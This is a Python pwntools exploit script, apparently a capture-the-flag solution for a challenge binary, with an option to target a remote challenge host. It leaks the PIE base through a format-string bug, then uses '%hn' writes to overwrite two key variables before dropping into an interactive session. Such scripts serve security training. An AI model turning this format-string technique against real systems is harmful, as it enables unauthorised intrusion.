#encoding = utf-8
import os
import sys
import time
from pwn import *
from LibcSearcher import * 

context.os = 'linux'
context.arch = 'amd64'
context.log_level = "debug"

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

local = 1

if local:
    p = process('./pwn')
else:
    p = remote('39.99.242.16',10002)

def pwn():
    pl = '%21$p'
    gdb.attach(p)
    pause()
    sla('hahah~\n',pl)
    pie = int(r(14),16)-0x1252
    print(hex(pie))
    key = pie + 0x4060
    key1 = pie + 0x4062
    key2 = 0xd687
    key3 = 0x12
    pl = b'\x00'*0x10 + p64(key) + p64(key1)
    p.sendlineafter("hahah~\n",pl)
   
    sla('hahah~','%'+str(key2)+'c'+'%10$hn')
    sla('hahah~','%'+str(key3)+'c'+'%11$hn')
    itr()

if __name__ == '__main__':
    pwn()